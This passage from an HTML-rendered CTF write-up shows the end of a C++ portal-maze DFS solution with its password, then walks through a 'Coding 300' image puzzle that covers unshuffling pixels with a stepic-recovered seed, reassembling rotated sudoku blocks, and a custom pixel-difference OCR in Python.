<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#BD976A">valid_portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">]</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#BD976A"> on_portal</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">])</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">            int</span><span style="color:#DBD7CAEE"> py </span><span style="color:#666666">=</span><span style="color:#BD976A"> portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">].</span><span style="color:#BD976A">first</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> px </span><span style="color:#666666">=</span><span style="color:#BD976A"> portals</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">].</span><span style="color:#BD976A">second</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            on_portal</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> false</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            on_portal</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">py</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">px</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> false</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            visited</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">            dfs</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">py</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> px</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> t </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> n_portals </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> path</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD976A">            visited</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> false</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            on_portal</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">nx</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">            on_portal</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">py</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">px</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> true</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> else</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">            dfs</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ny</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> nx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> t </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> n_portals</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> path</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#BD976A">        path</span><span style="color:#666666">.</span><span style="color:#80A665">pop_back</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD976A">    visited</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#4D9375"> false</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>And print the answer:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line"><span style="color:#80A665">    sort</span><span style="color:#666666">(</span><span style="color:#BD976A">paths</span><span style="color:#666666">.</span><span style="color:#80A665">begin</span><span style="color:#666666">(),</span><span style="color:#BD976A"> paths</span><span style="color:#666666">.</span><span style="color:#80A665">end</span><span style="color:#666666">());</span></span>
<span class="line"><span style="color:#DBD7CAEE">    cout </span><span style="color:#CB7676">&#x3C;&#x3C;</span><span style="color:#DBD7CAEE"> n_sols </span><span style="color:#CB7676">&#x3C;&#x3C;</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">string</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE"> s </span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> paths</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        cout </span><span style="color:#CB7676">&#x3C;&#x3C;</span><span style="color:#DBD7CAEE"> s</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#DBD7CAEE">    cout </span><span style="color:#CB7676">&#x3C;&#x3C;</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> &#x3C;&#x3C;</span><span style="color:#DBD7CAEE"> best_portals </span><span style="color:#CB7676">&#x3C;&#x3C;</span><span style="color:#DBD7CAEE"> endl</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>Password: <code>9-NENNNWSSSWWWWNENNWSSSWNWWWNENNWSSSWWNWWNENNWWSESWWWWNESWNNESWWWWWNESWNNEWSWWWWNEWNENWSSWWWWNEWWNEESWWWWWNEWWNEEWSWWWW-2</code></p>
<h3 id="coding-300">Coding 300</h3>
<h4 id="overwiew">Overwiew</h4>
<p>We are given a <code>png</code> file of a meaningless image and a really really vague description of what to do. The only thing that we know is that the image has been shuffled and there is some data hidden with <code>stepic</code>.</p>
<p>From the <code>README.md</code> file:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>np.random.seed(seed)</span></span>
<span class="line"><span>indices = np.random.permutation(len(pix))</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>stepic.encode(img, message)</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>imutils.rotate(img, angle=rot_angle)</span></span>
<span class="line"><span></span></span></code></pre>
<h4 id="first-step">First step</h4>
<p>It is clear that we have to somehow get (or guess) the seed. I called <code>stepic.decode</code> on the whole image and got <code>#####23#####</code>. I was running it also on chunks the of image and got weird stuffs, so I took a really long time to realize that it was not some weird artifact, but it was indeed the seed.</p>
<p>At least now we can unshuffle the image:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">img </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Image</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">open</span><span style="color:#666666">(</span><span style="color:#BD976A">file</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stepic</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">img</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">seed </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">replace</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">#</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">np</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">random</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">seed</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">seed</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">pix </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">getdata</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">indices </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> np</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">random</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">permutation</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pix</span><span style="color:#666666">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">real_pixs </span><span style="color:#666666">=</span><span style="color:#666666"> [</span><span style="color:#4D9375">None</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pix</span><span style="color:#666666">))]</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> n</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ind </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> enumerate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">indices</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    real_pixs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> pix</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">n</span><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">putdata</span><span style="color:#666666">(</span><span style="color:#B8A965">tuple</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">real_pixs</span><span style="color:#666666">))</span></span>
<span class="line"></span></code></pre>
<p>And we get this image
![Unshuffle]({{ site.baseurl }}/writeup_files/reply2022/images/SkOKvid.png)</p>
<h4 id="second-step">Second step</h4>
<p>That looks like a 16x16 sudoku, but shuffled. Thankfully the <code>README.md</code> gives an hint for this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Hint: once the image is reconstructed, each sub-block of the board will contain steganographed binary message, e.g., 010111. The two most significant digits represent how much it has been rotated, e.g., 01 = 90°, and the remaining four represent its original position</span></span>
<span class="line"><span></span></span></code></pre>
<p>After a bit of trial, errors and guessing, we find out that the sub-blocks are the 4x4 boxes and that we have to split the image in blocks of 481x481 pixels, run <code>stepic.decode</code> on them and rearrange them as explained.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">sections </span><span style="color:#666666">=</span><span style="color:#666666"> [[</span><span style="color:#4D9375">None</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">)]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">)]</span></span>
<span class="line"><span style="color:#DBD7CAEE">dim </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 481</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">height</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">width</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        cut </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">crop</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#DBD7CAEE">        sdata </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">stepic</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">cut</span><span style="color:#666666">)[</span><span style="color:#4C9A91">5</span><span style="color:#666666">:</span><span style="color:#4C9A91">11</span><span style="color:#666666">],</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        cut </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> cut</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">rotate</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">90</span><span style="color:#CB7676"> *</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">sdata </span><span style="color:#CB7676">>></span><span style="color:#4C9A91"> 4</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#DBD7CAEE">        sections</span><span style="color:#666666">[(</span><span style="color:#DBD7CAEE">sdata </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0b</span><span style="color:#4C9A91">11</span><span style="color:#666666">)][(</span><span style="color:#DBD7CAEE">sdata </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0b</span><span style="color:#4C9A91">1111</span><span style="color:#666666">)</span><span style="color:#CB7676"> >></span><span style="color:#4C9A91"> 2</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> cut</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">height</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">width</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">paste</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sections</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">x </span><span style="color:#CB7676">//</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">//</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">],</span><span style="color:#666666"> ((</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> dim</span><span style="color:#666666">)))</span></span>
<span class="line"></span></code></pre>
<p>Getting this nice sudoku:
![Sudoku!]({{ site.baseurl }}/writeup_files/reply2022/images/Fpdhs6Z.png)</p>
<h4 id="third-step">Third step</h4>
<p>OCR time… or not…</p>
<p><code>tesseract</code> fails miserably to read the image, but the numbers looks really regular, so we could try a pixel by pixel difference to recognize them. Suddenly the board is not super regular as well: it has an annoing border on the left and upper side and the image size is not divisible by 16.</p>
<p>What turned out to work is to crop the numbers as much as possible, after that, the root mean square of the difference of two equal numbers will always be almost zero.</p>
<p>We also need some reference, but since we have just 16 numbers, we can extract them by hand.</p>
<h5 id="my-ocr">My OCR</h5>
<p>So, we convert the image to gray-scale, approximately extract the numbers and crop them:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># For some weird reason, using any(...) doesn't work</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> iswhiterow</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pixs</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> left</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">left</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> pixs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">]</span><span style="color:#CB7676"> &#x3C;</span><span style="color:#4C9A91"> 100</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#4D9375"> True</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> iswhitecol</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pixs</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> up</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">up</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> pixs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">]</span><span style="color:#CB7676"> &#x3C;</span><span style="color:#4C9A91"> 100</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#4D9375"> True</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> super_crop</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">img</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    up </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#DBD7CAEE">    down </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">height </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">    left </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#DBD7CAEE">    right </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">width </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    pimg </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">load</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> iswhiterow</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pimg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> up</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> left</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        up </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> up </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> down</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> None</span><span style="color:#758575DD">  # Empty cell</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> iswhiterow</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pimg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> down</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> left</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        down </span><span style="color:#666666">-=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">    down </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> iswhitecol</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pimg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> left</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> up</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> down</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        left </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> iswhitecol</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">pimg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> up</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> down</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        right </span><span style="color:#666666">-=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">    right </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">crop</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">left</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> up</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> down</span><span style="color:#666666">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">img </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">convert</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">L</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">cuts </span><span style="color:#666666">=</span><span style="color:#666666"> []</span></span>
<span class="line"><span style="color:#DBD7CAEE">ydim </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">height </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 16</span></span>
<span class="line"><span style="color:#DBD7CAEE">xdim </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">width </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 16</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">height </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 20</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ydim</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">width </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 20</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> xdim</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        cuts</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">super_crop</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">crop</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">x </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> xdim </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> ydim </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">))))</span></span>
<span class="line"></span></code></pre>
<p>We save every cropped number and select by hand the reference images.</p>
<p>Now we can recognize every number</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> imgdiff</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">im1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> im2</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    diff </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ImageChops</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">difference</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">im1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> im2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> ImageStat</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Stat</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">diff</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">rms</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]</span></span>
<span class="line"></span>
